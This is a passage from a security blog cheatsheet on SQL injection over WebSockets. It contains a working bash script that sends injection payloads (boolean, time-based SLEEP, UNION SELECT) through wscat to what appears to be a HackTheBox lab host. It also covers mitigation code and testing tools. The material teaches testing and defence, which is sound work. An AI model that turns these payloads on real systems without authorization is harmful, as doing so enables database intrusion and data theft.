&#34;1&#39; AND SLEEP(5)-- -&#34;, &#34;1 UNION SELECT @@version-- -&#34; ] test_websocket_sqli(&#34;ws://target:9091&#34;, payloads) Bash Testing Script #!/bin/bash # WebSocket SQLi Testing Script URL=&#34;ws://soc-player.soccer.htb:9091&#34; echo &#34;Testing WebSocket SQL Injection&#34; echo &#34;Target: $URL&#34; # Array of payloads to test payloads=( &#34;1&#34; &#34;1&#39;&#34; &#34;1&#39; OR &#39;1&#39;=&#39;1-- -&#34; &#34;92130 or 5=1-- -&#34; &#34;1 AND SLEEP(5)-- -&#34; &#34;1 UNION SELECT @@version-- -&#34; ) for payload in &#34;${payloads[@]}&#34;; do echo &#34;Testing payload: $payload&#34; echo &#34;{\&#34;id\&#34;:\&#34;$payload\&#34;}&#34; | wscat -c $URL echo &#34;---&#34; sleep 2 done Mitigation and Prevention Secure WebSocket Implementation // Input validation function validateInput(data) { // Whitelist allowed characters if (!/^[a-zA-Z0-9_-]&#43;$/.test(data)) { throw new Error(&#34;Invalid input&#34;); } return data; } // Parameterized queries const query = &#34;SELECT * FROM users WHERE id = ?&#34;; db.query(query, [userId], callback); // Prepared statements const stmt = db.prepare(&#34;SELECT * FROM users WHERE id = ?&#34;); stmt.run(userId); WebSocket Security Headers // Implement proper authentication ws.on(&#39;connection&#39;, function(socket, request) { // Verify JWT token or session if (!isAuthenticated(request)) { socket.close(1008, &#39;Authentication required&#39;); return; } }); // Rate limiting const rateLimiter = new Map(); ws.on(&#39;message&#39;, function(data) { const clientId = getClientId(this); if (isRateLimited(clientId)) { this.close(1008, &#39;Rate limit exceeded&#39;); return; } }); Tools and Resources WebSocket Testing Tools wscat - Command-line WebSocket client Burp Suite - Professional WebSocket testing OWASP ZAP - Free WebSocket proxy websocat - Advanced WebSocket client sqlmap - Automated SQL injection testing Browser Developer Tools // Chrome/Firefox WebSocket inspection // 1. Open Developer Tools (F12) // 2. Go to Network tab // 3. Filter by WS (WebSocket) // 4. Interact with application // 5. Analyze WebSocket frames WebSocket SQL injection can be particularly dangerous as it often bypasses traditional web application firewalls. Always test WebSocket endpoints during security assessments and implement proper input validation and parameterized queries.
</p>
  </div>
  <footer class="entry-footer"><span title='2024-01-01 00:00:00 +0000 UTC'>January 1, 2024</span>&nbsp;·&nbsp;<span>7 min</span>&nbsp;·&nbsp;<span>realspaceeagle</span></footer>
  <a class="entry-link" aria-label="post link to WebSocket SQL Injection Cheatsheet" href="https://realspaceeagle.github.io/cheatsheets/websocket-sql-injection/"></a>
</article>
    </main>
    <footer class="footer">
  <div class="footer_inner wrap">
    <div class="footer_text">
      © 2025 realspaceeagle
    </div>
  </div>
</footer>
</body>

</html>
